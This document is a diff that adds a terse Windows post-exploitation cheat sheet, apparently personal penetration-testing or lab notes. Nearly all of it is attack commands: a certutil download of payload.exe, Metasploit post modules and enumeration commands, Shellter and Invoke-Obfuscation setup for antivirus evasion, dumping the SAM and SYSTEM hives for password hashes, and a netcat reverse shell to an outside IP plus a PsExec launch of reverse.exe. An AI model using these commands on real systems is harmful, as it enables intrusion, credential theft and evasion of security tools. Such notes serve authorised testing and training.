@@ -1,0 +1,96 @@
+# File upload
+    certutil -urlcache -f http://<TARGET_IP>/payload.exe payload.exe
+
+# Local enum
+    # Metasploit module
+    post/windows/manage/migrate
+    post/windows/gather/win_privs #CHECK UAC/Privileges
+    post/windows/gather/enum_logged_on_users
+    post/windows/gather/checkvm
+    post/windows/gather/enum_applications
+    post/windows/gather/enum_av_excluded
+    post/windows/gather/enum_computers
+    post/windows/gather/enum_patches
+    post/windows/gather/enum_shares
+    post/windows/manage/enable_rdp
+
+    # jaws 
+    powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws-Enum.txt
+    # meterpreter
+    getuid
+    sysinfo
+    show_mount
+    cat C:\\Windows\\System32\\eula.txt
+    getprivs
+
+    # cmd system
+    hostname
+    systeminfo
+    wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+    # cmd user 
+    whoami /priv
+    query user
+    net users
+    net user <USER>
+    net localgroup
+    net localgroup Administrators
+    net localgroup "Remote Desktop Users"
+
+    # cmd network
+    ipconfig /all
+    route print
+    arp -a
+    netstat -ano
+    netsh firewall show state
+    netsh advfirewall show allprofiles
+
+    # services
+    cmd services
+    ps
+    net start
+    wmic service list brief
+    tasklist /SVC
+    schtasks /query /fo LIST
+    schtasks /query /fo LIST /v
+
+# obfuscation 
+    shellter
+        # SHELLTER - Install
+        sudo apt update && sudo apt install -y shellter
+        sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32
+        rm -r ~/.wine
+
+        cd /usr/share/windows-resources/shellter
+        sudo shellter
+
+        mkdir AVBypass
+        cd AVBypass
+        cp /usr/share/windows-binaries/vncviewer.exe .
+        # Proceed in Sellter window
+
+    invoke-obfuscation
+        # installation
+        cd /opt
+        sudo git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
+        sudo apt update && sudo apt install -y powershell
+
+        pwsh
+        cd /opt/Invoke-Obfuscation/
+        Import-Module ./Invoke-Obfuscation.psd1
+        cd ..
+        Invoke-Obfuscation
+
+# post
+    # dump hashes
+    reg.exe save hklm\sam c:\temp\sam
+    reg.exe save hklm\system c:\temp\system
+    samdump2 system sam
+
+# connect to smb share : 
+    net use \\<IP>\\<SHARE> /u:<USERNAME> <PASSWORD>
+
+# Reverse shell nc.exe
+    Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.10.191.150 4445"
+    
+C:\PrivEsc\PSExec64.exe -accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
